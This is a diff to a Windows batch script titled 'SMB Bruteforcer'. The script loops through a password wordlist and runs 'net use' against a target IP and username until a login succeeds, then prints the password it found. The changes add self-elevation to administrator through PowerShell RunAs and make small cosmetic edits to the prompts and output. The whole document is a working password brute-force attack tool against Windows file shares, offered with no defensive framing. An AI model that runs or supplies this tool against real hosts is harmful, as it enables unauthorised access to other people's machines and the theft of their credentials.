@@ -1,10 +1,19 @@
 @echo off
-title SMB Bruteforce - by Schooi
-color A
+fltmc >nul 2>&1 || (
+    PowerShell Start -Verb RunAs '%0' 2> nul || (
+        >nul pause && exit 1
+    )
+    exit 0
+)
+cd %~dp0
+title SMB Bruteforcer - by Schooi
+call logo.bat
 echo.
-set /p ip="Enter IP Address: "
-set /p user="Enter Username: "
-set /p wordlist="Enter Password List: "
+echo SMB Bruteforcer
+echo.
+set /p ip=Console ^| Enter IP Address: 
+set /p user=Console ^| Enter Username: 
+set /p wordlist=Console ^| Enter Password List: 
 
 set /a count=1
 for /f %%a in (%wordlist%) do (
@@ -17,13 +26,13 @@ exit
 
 :success
 echo.
-echo Password Found! %pass%
+echo Success! ^| Password Found: %pass%
 net use \\%ip% /d /y >nul 2>&1
 pause
 exit
 
 :attempt
 net use \\%ip% /user:%user% %pass% >nul 2>&1
-echo ATTEMPT %count% | [%pass%]
+echo ATTEMPT %count% ^| [%pass%]
 set /a count=%count%+1
 if %errorlevel% EQU 0 goto success
